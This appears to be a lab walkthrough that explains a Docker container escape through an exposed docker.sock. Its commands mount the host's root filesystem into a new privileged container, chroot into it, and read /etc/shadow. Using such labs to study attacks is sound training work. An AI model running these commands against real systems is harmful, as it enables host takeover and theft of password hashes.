# Walkthrough: Docker Socket Escape

If you are stuck, here is the step-by-step methodology to compromise the host.

### Step 1: Vulnerability Identification
Once you are inside the compromised container, check for exposed UNIX sockets. 
`ls -la /var/run/docker.sock`

*Observation:* The file exists, is marked as a socket (`s`), and is writable by the root user. This means we can communicate directly with the host's Docker daemon.

### Step 2: Exploitation & Container Escape
We will use the Docker client binary mapped from the host to ask the host's Docker daemon to spin up a new, highly privileged container. We will mount the host's entire root directory `/` into a folder called `/hostOS`.

Execute the following payload:
`docker -H unix:///var/run/docker.sock run -it -v /:/hostOS ubuntu bash`

*Observation:* You are immediately dropped into the shell of a new rogue container. 

### Step 3: Impact Analysis & Host Takeover
While you have access to the host files in the `/hostOS` directory, you are still technically constrained by the container's process tree. Break the boundary completely using the `chroot` command.

`chroot /hostOS`

Verify your privileges:
`id`
`whoami`

Extract the target file to complete the lab:
`cat /etc/shadow`

**Congratulations! You have successfully escaped the container and achieved total host compromise.**
